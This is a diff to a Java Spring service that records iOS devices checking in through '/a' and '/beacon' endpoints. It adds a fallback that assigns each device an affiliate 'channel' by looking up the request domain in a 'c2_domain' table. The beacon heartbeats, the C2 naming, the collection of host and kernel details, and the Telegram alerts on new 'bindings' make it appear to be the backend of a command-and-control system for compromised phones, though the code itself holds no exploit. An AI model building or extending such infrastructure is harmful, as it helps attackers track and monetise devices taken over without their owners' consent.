@@ -8,11 +8,14 @@ import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Transactional;
 
+import com.device.dao.ChannelDao;
 import com.device.dao.DeviceDao;
 import com.device.dao.Ios18ParamDao;
 import com.device.dto.DeaconBody;
+import com.device.entity.ChannelEntity;
 import com.device.entity.DeviceEntity;
 import com.device.entity.Ios18ParamEntity;
+import com.device.util.DomainMatchUtil;
 
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
@@ -33,6 +36,9 @@ public class DeviceAsyncWriter {
 
 	@Autowired
 	private Ios18ParamDao ios18ParamDao;
+
+	@Autowired
+	private ChannelDao channelDao;
 
 	/** 飞机消息发送 Bean，必须通过外部注入调用才能走 @Async AOP 代理 */
 	@Autowired
@@ -108,12 +114,15 @@ public class DeviceAsyncWriter {
 
 
 	/**
-	 * 从 /a 接口异步绑定或插入设备
+	 * 从 /a 接口异步绑定或插入设备。
+	 * <p>channelcode：仅当为空时按请求域名查 {@code qudao.c2_domain} 兜底；
+	 * 已有非空渠道不覆盖（/register 写入的渠道不受影响）。
 	 */
 	@Async("databaseOperateStreamPush")
 	@Transactional
-	public void bindOrInsertFromA(String lhu, String clientIp, String model, String deviceName, String iosVersion,
-			String buildVersion, String hostname, String sysname, String release, String kernelVersion, String source) {
+	public void bindOrInsertFromA(String lhu, String domain, String clientIp, String model, String deviceName,
+			String iosVersion, String buildVersion, String hostname, String sysname, String release,
+			String kernelVersion, String source) {
 		if (lhu == null || lhu.isEmpty()) {
 			return;
 		}
@@ -133,19 +142,23 @@ public class DeviceAsyncWriter {
 				existing.setOnlinestatus(1);
 				existing.setLastEventAt(now);
 				existing.setC2Series(1);
+				boolean filledChannel = fillChannelIfBlank(existing, domain);
+				if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
+					existing.setDomain(domain);
+				}
 				int temp = deviceDao.updateById(existing);
-				log.debug("设备绑定状态更新成功 lhu={} ip={}", lhu, clientIp);
+				log.debug("设备绑定状态更新成功 lhu={} ip={} channelFilled={}", lhu, clientIp, filledChannel);
 				// 发送飞机消息 —— 走外部 Bean 调用，@Async 才会生效（类内 this 调用会跳过 AOP）
-				if(temp > 0) {
+				if (temp > 0) {
 					deviceTelegramService.notifyBindingByDeviceIdAsync(existing);
 				}
 			} else {
-				// 未命中：INSERT（渠道空）
+				// 未命中：INSERT；渠道优先域名兜底，查不到则空（等后续 register / beacon 再补）
 				DeviceEntity newDevice = new DeviceEntity();
 				newDevice.setDeviceId(lhu);
 				newDevice.setDevice_id(lhu);
 				newDevice.setChannelCode("");
-				newDevice.setDomain("");
+				newDevice.setDomain(domain == null ? "" : domain);
 				newDevice.setIp(clientIp);
 				newDevice.setAddtime(now);
 				newDevice.setIpstatus(0);
@@ -157,8 +170,9 @@ public class DeviceAsyncWriter {
 				newDevice.setDeviceName(deviceName == null ? "" : deviceName);
 				newDevice.setIosVersion(iosVersion == null ? "" : iosVersion);
 				newDevice.setC2Series(1);
+				fillChannelIfBlank(newDevice, domain);
 				deviceDao.insert(newDevice);
-				log.info("设备新增成功,未绑定渠道 lhu={} ip={}", lhu, clientIp);
+				log.info("设备新增成功 lhu={} ip={} channel={}", lhu, clientIp, newDevice.getChannelCode());
 			}
 		} catch (Exception e) {
 			log.info("/a 设备绑定失败 lhu={} ip={} err={}", lhu, clientIp, e.toString(), e);
@@ -193,6 +207,7 @@ public class DeviceAsyncWriter {
 	/**
 	 * /beacon 设备 upsert（三分支：新增 / 更新在线状态 / 补绑触发 Telegram）。
 	 * 已绑定设备按 {@link #beaconDeviceUpdateIntervalSec} 限流 UPDATE；不写 ios18param。
+	 * <p>channelcode 为空时按域名查 qudao 兜底；已有渠道不覆盖。
 	 */
 	@Async("databaseOperateStreamPush")
 	@Transactional
@@ -208,7 +223,7 @@ public class DeviceAsyncWriter {
 			newDevice.setDeviceId(uuid);
 			newDevice.setDevice_id(uuid);
 			newDevice.setChannelCode("");
-			newDevice.setDomain(domain);
+			newDevice.setDomain(domain == null ? "" : domain);
 			newDevice.setIp(clientIp);
 			newDevice.setAddtime(now);
 			newDevice.setIpstatus(0);
@@ -222,15 +237,17 @@ public class DeviceAsyncWriter {
 				newDevice.setModel(request.getDeviceInfo().getMachine());
 			}
 			newDevice.setC2Series(1);
+			fillChannelIfBlank(newDevice, domain);
 			try {
 				deviceDao.insert(newDevice);
-				log.info("/beacon 设备新增成功，没有渠道 uuid={} ip={}", uuid, clientIp);
+				log.info("/beacon 设备新增成功 uuid={} ip={} channel={}",
+						uuid, clientIp, newDevice.getChannelCode());
 			} catch (Exception e) {
 				log.info("/beacon 设备新增失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
 			}
 		} else if (existing.getBindPhase() != null && existing.getBindPhase() == 1
 				&& existing.getDevicestatus() != null && existing.getDevicestatus() == 1) {
-			// 高频心跳：节流 UPDATE，避免每秒刷 device 表
+			// 高频心跳：节流 UPDATE；渠道为空时仍立即补写
 			String oldIp = existing.getIp() == null ? "" : existing.getIp();
 			String newIp = clientIp == null ? "" : clientIp;
 			boolean ipChanged = !oldIp.equals(newIp);
@@ -238,7 +255,14 @@ public class DeviceAsyncWriter {
 			Double last = existing.getLastEventAt();
 			boolean stale = last == null
 					|| (now - last) >= Math.max(1L, beaconDeviceUpdateIntervalSec);
-			if (!ipChanged && !wasOffline && !stale) {
+			boolean needChannel = DomainMatchUtil.isBlank(existing.getChannelCode());
+			boolean filledChannel = needChannel && fillChannelIfBlank(existing, domain);
+			boolean filledDomain = false;
+			if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
+				existing.setDomain(domain);
+				filledDomain = true;
+			}
+			if (!ipChanged && !wasOffline && !stale && !filledChannel && !filledDomain) {
 				log.debug("/beacon 设备心跳跳过写库(节流) uuid={} intervalSec={}",
 						uuid, beaconDeviceUpdateIntervalSec);
 				return;
@@ -250,7 +274,9 @@ public class DeviceAsyncWriter {
 			deviceDao.updateById(existing);
 			log.info("/beacon 设备更新成功 uuid={} ip={} reason={}",
 					uuid, clientIp,
-					ipChanged ? "ip_changed" : (wasOffline ? "online" : "heartbeat"));
+					filledChannel ? "channel_fill"
+							: (filledDomain ? "domain_fill"
+							: (ipChanged ? "ip_changed" : (wasOffline ? "online" : "heartbeat"))));
 		} else {
 			existing.setBindPhase(1);
 			existing.setDevicestatus(1);
@@ -258,6 +284,10 @@ public class DeviceAsyncWriter {
 			existing.setIp(clientIp);
 			existing.setLastEventAt(now);
 			existing.setC2Series(1);
+			fillChannelIfBlank(existing, domain);
+			if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
+				existing.setDomain(domain);
+			}
 			if (request.getDeviceInfo() != null) {
 				if (request.getDeviceInfo().getIosVersion() != null
 						&& !request.getDeviceInfo().getIosVersion().isEmpty()) {
@@ -277,7 +307,40 @@ public class DeviceAsyncWriter {
 				// 走外部 Bean 调用，@Async 才会生效（类内 this 调用会跳过 AOP）
 				deviceTelegramService.notifyBindingByDeviceIdAsync(existing);
 			}
-			log.info("/beacon 设备补绑成功 uuid={} ip={}", uuid, clientIp);
+			log.info("/beacon 设备补绑成功 uuid={} ip={} channel={}",
+					uuid, clientIp, existing.getChannelCode());
+		}
+	}
+
+	/**
+	 * 仅当 device.channelcode 为空时，按域名查 qudao.c2_domain 写入。
+	 * @return true 表示本次写入了渠道
+	 */
+	private boolean fillChannelIfBlank(DeviceEntity device, String domainRaw) {
+		if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
+			return false;
+		}
+		String host = DomainMatchUtil.normalizeHost(domainRaw);
+		if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
+			host = DomainMatchUtil.normalizeHost(device.getDomain());
+		}
+		if (host.isEmpty()) {
+			return false;
+		}
+		try {
+			ChannelEntity ch = channelDao.findByC2DomainHost(host);
+			if (ch == null || DomainMatchUtil.isBlank(ch.getChannelcode())) {
+				log.debug("域名兜底未命中渠道 host={} device={}", host, device.getDeviceId());
+				return false;
+			}
+			device.setChannelCode(ch.getChannelcode().trim());
+			log.info("域名兜底写入渠道 device={} host={} channel={}",
+					device.getDeviceId(), host, device.getChannelCode());
+			return true;
+		} catch (Exception e) {
+			log.warn("域名兜底查渠道失败 host={} device={} err={}",
+					host, device.getDeviceId(), e.toString());
+			return false;
 		}
 	}
 
